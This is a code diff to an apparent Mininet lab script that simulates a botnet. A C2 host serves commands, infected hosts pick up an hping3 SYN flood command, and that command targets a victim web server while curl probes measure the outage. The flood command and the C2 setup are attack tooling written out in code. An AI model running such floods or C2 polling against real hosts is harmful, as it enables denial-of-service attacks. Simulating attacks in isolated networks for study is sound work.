@@ -18,6 +18,9 @@ def ping(source, target, times=1, timeout=1) -> List[float]:
     return [source.cmd(f"ping -c 1 -w {timeout} {target.IP()} | grep time=").strip() for _ in range(times)]
 
 
+def curl(source, target, times=1, timeout=1) -> List[str]:
+    return [source.cmd(f"curl {target.IP()} --max-time {timeout}").strip() for _ in range(times)]
+
 results = Path("/tmp/results")
 results.mkdir(exist_ok=True)
 
@@ -27,7 +30,7 @@ Popen("mn -c", shell=True).wait()
 
 # Ensure required packages are installed
 cprint("[+] Installing required packages...")
-Popen("apt-get update && apt-get install -y bwm-ng tcpdump hping3", shell=True).wait()
+Popen("apt-get update && apt-get install -y bwm-ng tcpdump hping3 apache2 curl", shell=True).wait()
 
 # Create a network
 net = Mininet(controller=OVSController)
@@ -44,10 +47,24 @@ net.pingAll()
 
 h1, h2, h3, h4, h5, h6 = net.get('h1', 'h2', 'h3', 'h4', 'h5', 'h6')
 
+# Run an apache server on h1 (victim node)
+cprint("[+] Setting up the victim server...")
+h1.cmd("echo 'Hello, World!' > index.html")
+h1.cmd("python3 -m http.server 80 &> /tmp/victim.log &")
+
+cprint("    [+] Waiting for the victim server to be ready...")
+time.sleep(2)
+
+out = h1.cmd("curl http://localhost")
+if "Hello, World!" not in out:
+    cprint("[-] Victim server is not ready. Exiting...")
+    print(out)
+    exit(1)
+
 # Run a simple webserver on h5 (attacker node (C2 Server))
 cprint("[+] Setting up the C2 server...")
 h6.cmd("echo 'ls' > command")
-h6.cmd("python3 -m http.server 80 &> /tmp/server.log &")
+h6.cmd("python3 -m http.server 80 &> /tmp/c2.log &")
 
 cprint("    [+] Waiting for the C2 server to be ready...")
 time.sleep(2)
@@ -56,7 +73,7 @@ out = h2.cmd(f"curl http://{h6.IP()}/command")
 if "ls" not in out:
     cprint("[-] C2 server is not ready. Exiting...")
     print(out)
-    print(h6.cmd("cat /tmp/server.log"))
+    print(h6.cmd("cat /tmp/c2.log"))
     exit(1)
 
 cprint(f"[+] C2 server is ready. ({out.strip()})")
@@ -99,18 +116,21 @@ cprint("[+] Network is ready. Checking connectivity...")
 net.pingAll()
 
 cprint("[+] Network is ready. Starting the attack...")
-cmd = f"sudo hping3 --flood --udp {h1.IP()} &"
+cmd = f"sudo hping3 -S --flood -V -d 1200 -p 80 {h1.IP()}"
 cprint(f"    [+] Running: {cmd}")
 h5.cmd(f"echo \"{cmd}\" > command")
 
 cprint("    [+] Waiting for the attack to take effect...")
-time.sleep(10)
+start = time.time()
+while time.time() - start < 10:
+    print(curl(h3, h1))
+    time.sleep(1)
 
 cprint("    [+] Press Ctrl+C once to stop the attack or wait for 30 seconds...")
 start = time.time()
 try:
     while time.time() - start < 30:
-        print(ping(h3, h1))
+        print(curl(h3, h1))
         time.sleep(1)
 except KeyboardInterrupt:
     pass
@@ -138,7 +158,8 @@ cprint("[+] Copying logs...")
 for host in [h2, h4, h5]:
     (results / f"{host.name}.txt").write_text(host.cmd("cat /tmp/virus.log"))
 
-(results / "server.log").write_text(h6.cmd("cat /tmp/server.log"))
+(results / "victim.log").write_text(h1.cmd("cat /tmp/victim.log"))
+(results / "c2.log").write_text(h6.cmd("cat /tmp/c2.log"))
 
 cprint("[+] Logs copied.")
 
